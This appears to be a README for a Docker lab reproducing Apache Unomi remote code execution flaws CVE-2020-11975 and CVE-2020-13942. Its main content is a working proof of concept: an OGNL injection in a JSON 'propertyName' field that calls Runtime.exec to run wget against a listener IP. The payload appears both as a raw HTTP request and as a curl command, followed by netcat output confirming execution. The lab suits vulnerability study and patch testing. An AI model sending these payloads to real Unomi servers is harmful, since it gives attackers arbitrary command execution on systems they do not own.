# Unomi Enviroment for CVE-2020-11975 & CVE-2020-13942

[Apache Unomi](https://unomi.apache.org/) allows conditions to use OGNL scripting which offers the possibility to call static Java classes from the JDK that could execute code with the permission level of the running Java process.

## Affected Version

|      CVE     | Range |
|--------------|-----------|
| CVE-2020-11975 | <= 1.5.0 |
| CVE-2020-13942 | <= 1.5.1 |

## Usage

Run following command to startup the apache unomi 1.5.0

```bash
docker-compose up
```

### Poc of CVE-2020-11975

After start the `unomi`, listenning on port `8000` with following command

```bash
nc -llv 8000
```

Send the request below with Burp Suite

> Remeber to replace the ip address `{your ip address}` with yourself, on my device it's `192.168.1.111`.

```http
POST /context.json HTTP/1.1
Host: localhost:8181
Connection: close
Content-Type: application/json
Content-Length: 1527


{
    "source": null,
    "requireSegments": false,
    "requiredProfileProperties": null,
    "requiredSessionProperties": null,
    "events": null,
    "filters": null,
    "personalizations": [
        {
            "id": "gender-test",
            "strategy": "matching-first",
            "strategyOptions": {
                "fallback": "var2"
            },
            "contents": [
                {
                    "id": "var1",
                    "filters": [
                        {
                            "appliesOn": null,
                            "condition": {
                                "parameterValues": {
                                    "propertyName": "(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"wget http://{your ip address}:8000\"))",
                                    "comparisonOperator": "equals",
                                    "propertyValue": "male"
                                },
                                "type": "profilePropertyCondition"
                            },
                            "properties": null
                        }
                    ],
                    "properties": null
                },
                {
                    "id": "var2",
                    "filters": null,
                    "properties": null
                }
            ]
        }
    ],
    "profileOverrides": null,
    "sessionPropertiesOverrides": null,
    "sessionId": "demo-session-id"
}
```

or use curl

```bash
curl --location --request POST 'http://localhost:8181/cxs/context.json' \
--header 'Content-Type: application/json' \
--header 'Cookie: JSESSIONID=48C8AFB3E18B8E3C93C2F4D5B7BD43B7; context-profile-id=01060c4c-a055-4c8f-9692-8a699d0c434a' \
--data-raw '{
    "source": null,
    "requireSegments": false,
    "requiredProfileProperties": null,
    "requiredSessionProperties": null,
    "events": null,
    "filters": null,
    "personalizations": [
        {
            "id": "gender-test",
            "strategy": "matching-first",
            "strategyOptions": {
                "fallback": "var2"
            },
            "contents": [
                {
                    "id": "var1",
                    "filters": [
                        {
                            "appliesOn": null,
                            "condition": {
                                "parameterValues": {
                                    "propertyName": "(#r=@java.lang.Runtime@getRuntime()).(#r.exec(\"wget http://{your ip address}:8000\"))",
                                    "comparisonOperator": "equals",
                                    "propertyValue": "male"
                                },
                                "type": "profilePropertyCondition"
                            },
                            "properties": null
                        }
                    ],
                    "properties": null
                },
                {
                    "id": "var2",
                    "filters": null,
                    "properties": null
                }
            ]
        }
    ],
    "profileOverrides": null,
    "sessionPropertiesOverrides": null,
    "sessionId": "demo-session-id"
}'
```

And you will see the feedback from container.

```
$ nc -llv 8000         
GET / HTTP/1.1
User-Agent: Wget/1.21
Accept: */*
Accept-Encoding: identity
Host: 192.168.1.111:8000
Connection: Keep-Alive
```
